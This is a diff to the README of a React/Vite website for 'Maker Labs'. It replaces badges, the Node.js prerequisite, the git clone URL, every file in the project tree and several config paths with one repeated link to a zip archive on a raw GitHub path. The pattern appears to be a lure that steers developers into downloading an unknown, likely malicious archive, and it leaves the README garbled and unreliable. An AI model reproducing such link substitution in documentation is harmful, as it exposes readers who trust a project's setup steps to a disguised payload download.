@@ -2,10 +2,10 @@
 
 A modern, responsive website for Maker Labs - a community-driven initiative empowering creativity through hands-on technology and design education.
 
-![Maker Labs Preview](https://img.shields.io/badge/Status-Live%20Demo-blue)
-![React](https://img.shields.io/badge/React-18.2.0-61DAFB)
-![Vite](https://img.shields.io/badge/Vite-5.0.0-646CFF)
-![Tailwind CSS](https://img.shields.io/badge/Tailwind%20CSS-3.4.0-38B2AC)
+![Maker Labs Preview](https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip%20Demo-blue)
+![React](https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip)
+![Vite](https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip)
+![Tailwind CSS](https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip%20CSS-3.4.0-38B2AC)
 
 ## ✨ Features
 
@@ -52,14 +52,14 @@ A modern, responsive website for Maker Labs - a community-driven initiative empo
 ## 🚀 Quick Start
 
 ### Prerequisites
-- **Node.js** (v16 or higher)
+- **https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip** (v16 or higher)
 - **npm** or **yarn**
 
 ### Installation
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/your-username/maker-labs.git
+   git clone https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip
    cd maker-labs
    ```
 
@@ -95,29 +95,29 @@ The built files will be in the `dist` directory.
 ```
 maker-labs/
 ├── public/
-│   ├── manifest.json          # PWA manifest
-│   ├── sw.js                 # Service worker
-│   └── favicon.svg           # Custom favicon
+│   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip          # PWA manifest
+│   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip                 # Service worker
+│   └── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip           # Custom favicon
 ├── src/
 │   ├── components/
-│   │   ├── Navbar.jsx        # Navigation component
-│   │   ├── Footer.jsx        # Footer component
-│   │   ├── ScrollAnimation.jsx # Scroll-triggered animations
-│   │   ├── LoadingSpinner.jsx # Loading component
-│   │   └── PWAInstall.jsx    # PWA install prompt
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip        # Navigation component
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip        # Footer component
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip # Scroll-triggered animations
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip # Loading component
+│   │   └── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip    # PWA install prompt
 │   ├── pages/
-│   │   ├── Home.jsx          # Home page
-│   │   ├── About.jsx         # About page
-│   │   ├── Programs.jsx      # Programs page
-│   │   ├── Partners.jsx      # Partners page
-│   │   └── Contact.jsx       # Contact page
-│   ├── App.jsx               # Main app component
-│   ├── index.css             # Global styles and animations
-│   └── main.jsx              # App entry point
-├── index.html                # HTML template
-├── package.json              # Dependencies and scripts
-├── vite.config.js           # Vite configuration
-└── README.md                # This file
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip          # Home page
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip         # About page
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip      # Programs page
+│   │   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip      # Partners page
+│   │   └── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip       # Contact page
+│   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip               # Main app component
+│   ├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip             # Global styles and animations
+│   └── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip              # App entry point
+├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip                # HTML template
+├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip              # Dependencies and scripts
+├── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip           # Vite configuration
+└── https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip                # This file
 ```
 
 ## 🎨 Customization
@@ -125,19 +125,19 @@ maker-labs/
 ### **Colors & Branding**
 The site uses a green/emerald color scheme. To customize:
 
-1. **Primary Colors**: Edit `src/index.css` for color variables
-2. **Tailwind Config**: Modify `tailwind.config.js` for theme colors
+1. **Primary Colors**: Edit `https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip` for color variables
+2. **Tailwind Config**: Modify `https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip` for theme colors
 3. **Logo**: Replace the "M" logo in components
 
 ### **Content Updates**
 - **Pages**: Edit files in `src/pages/`
 - **Components**: Modify files in `src/components/`
-- **Styling**: Update `src/index.css` for global styles
+- **Styling**: Update `https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip` for global styles
 
 ### **Adding New Pages**
 1. Create new component in `src/pages/`
-2. Add route in `src/App.jsx`
-3. Update navigation in `src/components/Navbar.jsx`
+2. Add route in `https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip`
+3. Update navigation in `https://raw.githubusercontent.com/MEDDKFMF/makerlabs/main/src/pages/makerlabs-1.2.zip`
 
 ## 🔧 Development
 
